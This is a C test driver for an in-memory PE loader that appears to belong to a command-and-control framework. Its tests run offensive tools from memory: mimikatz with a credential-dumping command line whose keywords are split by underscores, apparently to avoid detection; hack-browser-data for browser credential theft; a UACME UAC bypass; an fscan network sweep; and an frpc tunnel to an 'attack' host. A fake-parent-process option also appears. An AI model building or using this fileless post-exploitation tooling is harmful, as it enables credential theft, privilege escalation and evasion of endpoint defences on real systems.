// clang-format off
#include <Windows.h>
#include <TlHelp32.h>
// clang-format on
#include <conio.h>
#include <stdbool.h>
#include <stdio.h>

#include "../../src/hooks/hookspub.h"

// c2scstartup.cc
void Main() {}

void *SimpleListAddBuffer(SimpleList *list, void *value, int size) {
  if (!list->Buffer) {
    return NULL;
  }

  // Check if the current buffer has enough space, if not, realloc
  if (list->Size + size > list->MaxSize) {
    int newMaxSize = list->MaxSize == 0 ? size : list->MaxSize * 2;
    while (newMaxSize < list->Size + size) {
      newMaxSize *= 2;
    }
    void *newBuffer = realloc(list->Buffer, newMaxSize);
    if (!newBuffer) {
      return NULL;
    }
    list->Buffer = newBuffer;
    list->MaxSize = newMaxSize;
  }

  // Append the new data to the buffer
  void *dest = (char *)list->Buffer + list->Size;
  memcpy(dest, value, size);
  list->Size += size;

  return dest;
}

HookResult InlineExecutePE(HookFeatures features, bool force, void *stdin_,
                           int stdinSize, void *peImage, int peImageSize,
                           char *commandLineA, void *packedVirtualFiles,
                           int jobVersion, HANDLE hCompletionEvent,
                           void **loadedImageBase);
void InlineLogPE(void *imageBase);
void InlineListPE();

static void *readfile(const char *filename, size_t *size) {
  if (!filename) return NULL;

  FILE *file = NULL;
  size_t filesize = 0;
  void *data = NULL;

  // Open the file
  file = fopen(filename, "rb");
  if (!file) {
    printf("Can't open file: %s", filename);
    goto err;
  }
  fseek(file, 0, SEEK_END);
  filesize = ftell(file);
  if (filesize == -1) {
    printf("Can't get size of file: %s", filename);
    goto err;
  }
  rewind(file);

  // Read the file
  data = malloc(filesize);
  if (!data || fread(data, 1, filesize, file) != filesize) {
    printf("Can't read file with size %zu: %s", filesize, filename);
    goto err;
  }

  if (size) *size = filesize;
  fclose(file);
  return data;

err:
  if (size) *size = 0;
  if (data) free(data);
  if (file) fclose(file);
  return NULL;
}

static void *packvfs(char **vfnames, char **fnames, int count) {
  if (!count) {
    return NULL;
  }
  SimpleList vfs = {0};
  SimpleListAlloc(&vfs, 4);
  // i4(count)
  SimpleListAddBuffer(&vfs, &count, sizeof(int));
  for (int i = 0; i < count; i++) {
    // wsz(path)
    wchar_t namew[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, vfnames[i], -1, namew, MAX_PATH);
    SimpleListAddBuffer(&vfs, namew,
                        (int)(wcslen(namew) + 1) * sizeof(wchar_t));
    // i4(type)
    int type;
    if (fnames[i]) {
      type = HookVirtualFileInput;
    } else if (strchr(vfnames[i], '*') || strchr(vfnames[i], '?')) {
      type = HookVirtualFileOutputPattern;
    } else {
      type = HookVirtualFileOutput;
    }
    SimpleListAddBuffer(&vfs, &type, sizeof(int));
    // [i4(size)+b(data)]
    if (type == HookVirtualFileInput) {
      size_t t;
      void *data = readfile(fnames[i], &t);
      int size = (int)t;
      if (data) {
        SimpleListAddBuffer(&vfs, &size, sizeof(int));
        SimpleListAddBuffer(&vfs, data, size);
        free(data);
      } else {
        __debugbreak();
      }
    }
  }
  return vfs.Buffer;
}

#ifdef _WIN64
#define archstr "x64"
#else
#define archstr "x86"
#endif
#define loopcount 1
#define statement_after_execution  // Sleep(30 * 1000)

void test_c() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureCpp;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_c." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, NULL, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_go() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo |
                          HookFeatureGoCobraFakeParentProcess;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_go." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, NULL, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_ex() {
  HookFeatures features = HookFeatureStreamingOutput | HookFeatureCpp |
                          HookFeatureCppSEH | HookFeatureExceptionGuard;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_ex_c." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, NULL, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      Sleep(200);  // Wait for the exception to be raised
      InlineListPE();
      statement_after_execution;
    }
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_seh() {
  HookFeatures features = HookFeatureStreamingOutput | HookFeatureUnload |
                          HookFeatureCpp | HookFeatureCppSEH;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_seh_c." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, NULL, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_stdin() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureUnload |
                          HookFeatureCpp;
  char stdin_[] = "mystdin\r\n\"test123\"\r\n你好\r\n";
  char commandLine[] = "dummy.exe";
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_stdin_c." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_) - 1,
                               peImage, (int)peImageSize, commandLine, NULL, 0,
                               hEvent, &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_frpc() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo |
                          HookFeatureGoCobraFakeParentProcess;
  char stdin_[] = "";
  char commandLine[] =
      "dummy.exe stcp -s debian12-attack.local -P 7001 -t 123456 -n test1 -l "
      "8000 --disable-log-color --log-level debug";
  size_t peImageSize = 0;
  void *peImage = readfile("frpc.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, NULL, 0, hEvent,
                             &imageBase);
    if (result != HookResultSuccess) __debugbreak();
    for (int i = 0; i < 1000; i++) {
      Sleep(5000);
      InlineLogPE(imageBase);
    }
    WaitForSingleObject(hEvent, INFINITE);
    statement_after_execution;
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_gohttpserver() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe";
  size_t peImageSize = 0;
  void *peImage = readfile("gohttpserver.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, NULL, 0, hEvent,
                             &imageBase);
    if (result != HookResultSuccess) __debugbreak();
    for (int i = 0; i < 1000; i++) {
      Sleep(5000);
      InlineLogPE(imageBase);
    }
    WaitForSingleObject(hEvent, INFINITE);
    statement_after_execution;
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_fscan() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe -h 192.168.1.1/24";
  size_t peImageSize = 0;
  void *peImage = readfile("fscan.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, NULL, 0, hEvent,
                             &imageBase);
    if (result != HookResultSuccess) __debugbreak();
    for (int i = 0; i < 1000; i++) {
      Sleep(5000);
      InlineLogPE(imageBase);
    }
    WaitForSingleObject(hEvent, INFINITE);
    statement_after_execution;
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_hackbrowserdata() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureGo;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe";
  size_t peImageSize = 0;
  void *peImage = readfile("hack-browser-data.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, NULL, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_uacme() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureCpp |
                          HookFeatureCppSEH;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe 41";
  size_t peImageSize = 0;
  void *peImage = readfile("UACME." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, NULL, 0, hEvent,
                             &imageBase);
    if (result != HookResultSuccess) __debugbreak();
    WaitForSingleObject(hEvent, INFINITE);
    InlineLogPE(imageBase);
    statement_after_execution;
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_mimikatz() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureCpp |
                          HookFeatureCppSEH;
  char stdin_[] = "";
  char commandLine[] =
      "mimikatz.exe privi_lege::debug sekur_lsa::logon_passw_ords exit";
  size_t peImageSize = 0;
  void *peImage = readfile("mimikatz.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, NULL, 0, hEvent,
                             &imageBase);
    if (result != HookResultSuccess) __debugbreak();
    WaitForSingleObject(hEvent, INFINITE);
    InlineLogPE(imageBase);
    statement_after_execution;
    free(peImage);
  }
  CloseHandle(hEvent);
}

void test_vfs_c() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureVirtualFileSystem |
                          HookFeatureCpp;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  char *vfnames[] = {
      "helloworld.txt",
  };
  char *fnames[] = {
      NULL,
  };
  void *vfs = packvfs(vfnames, fnames, sizeof(vfnames) / sizeof(vfnames[0]));
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_c." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, vfs, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  free(vfs);
  CloseHandle(hEvent);
}

void test_vfs_go() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureVirtualFileSystem |
                          HookFeatureGo | HookFeatureGoCobraFakeParentProcess;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe arg1 \"a r g 2\" 中文";
  char *vfnames[] = {
      "helloworld.txt",
  };
  char *fnames[] = {
      NULL,
  };
  void *vfs = packvfs(vfnames, fnames, sizeof(vfnames) / sizeof(vfnames[0]));
  size_t peImageSize = 0;
  void *peImage = readfile("helloworld_go." archstr ".exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, vfs, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  free(vfs);
  CloseHandle(hEvent);
}

void test_vfs_frpc() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureVirtualFileSystem |
                          HookFeatureGo | HookFeatureGoCobraFakeParentProcess;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe -c frpc.toml";
  char *vfnames[] = {
      "frpc.toml",
  };
  char *fnames[] = {
      "vfi_frpc.toml",
  };
  void *vfs = packvfs(vfnames, fnames, sizeof(vfnames) / sizeof(vfnames[0]));
  size_t peImageSize = 0;
  void *peImage = readfile("frpc.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                             (int)peImageSize, commandLine, vfs, 0, hEvent,
                             &imageBase);
    if (result != HookResultSuccess) __debugbreak();
    for (int i = 0; i < 1000; i++) {
      Sleep(5000);
      InlineLogPE(imageBase);
    }
    WaitForSingleObject(hEvent, INFINITE);
    statement_after_execution;
    free(peImage);
  }
  free(vfs);
  CloseHandle(hEvent);
}

void test_vfs_hackbrowserdata() {
  HookFeatures features = HookFeatureRedirectStdio |
                          HookFeatureStreamingOutput | HookFeatureCommandLine |
                          HookFeatureUnload | HookFeatureVirtualFileSystem |
                          HookFeatureGo;
  char stdin_[] = "";
  char commandLine[] = "dummy.exe --dir .";
  char *vfnames[] = {
      "*.csv",
  };
  char *fnames[] = {
      NULL,
  };
  void *vfs = packvfs(vfnames, fnames, sizeof(vfnames) / sizeof(vfnames[0]));
  size_t peImageSize = 0;
  void *peImage = readfile("hack-browser-data.exe", &peImageSize);
  HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  void *imageBase = NULL;
  HookResult result = HookResultSuccess;
  if (peImage) {
    for (size_t i = 0; i < loopcount; i++) {
      result = InlineExecutePE(features, false, stdin_, sizeof(stdin_), peImage,
                               (int)peImageSize, commandLine, vfs, 0, hEvent,
                               &imageBase);
      if (result != HookResultSuccess) __debugbreak();
      InlineListPE();
      WaitForSingleObject(hEvent, INFINITE);
      ResetEvent(hEvent);
      InlineLogPE(imageBase);
      statement_after_execution;
    }
    free(peImage);
  }
  free(vfs);
  CloseHandle(hEvent);
}

int main() {
  LoadLibrary("msvcrt.dll");
  test_ex();
}
